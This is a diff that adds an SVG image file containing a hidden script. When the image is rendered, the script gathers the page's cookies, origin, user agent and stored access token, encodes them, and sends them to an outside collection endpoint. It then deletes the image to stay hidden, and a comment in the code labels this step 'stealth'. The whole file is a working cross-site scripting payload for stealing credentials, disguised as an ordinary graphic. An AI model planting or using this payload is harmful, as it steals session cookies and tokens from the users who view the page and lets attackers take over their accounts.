@@ -1,0 +1,22 @@
+<!-- xss.svg -->
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
+  <rect width="100" height="100" fill="transparent"/>
+  <script>
+    const exfil = btoa(JSON.stringify({
+      cookies: document.cookie,
+      origin: location.origin,
+      userAgent: navigator.userAgent,
+      token: localStorage.getItem('access_token')
+    }));
+    
+    fetch(`https://carlos0osama.github.io/xss_tests/collect?d=${exfil}`, {
+      mode: 'no-cors',
+      credentials: 'include'
+    }).catch(e => {});
+    
+    // Maintain stealth
+    setTimeout(() => {
+      document.querySelector('svg').remove();
+    }, 3000);
+  </script>
+</svg>
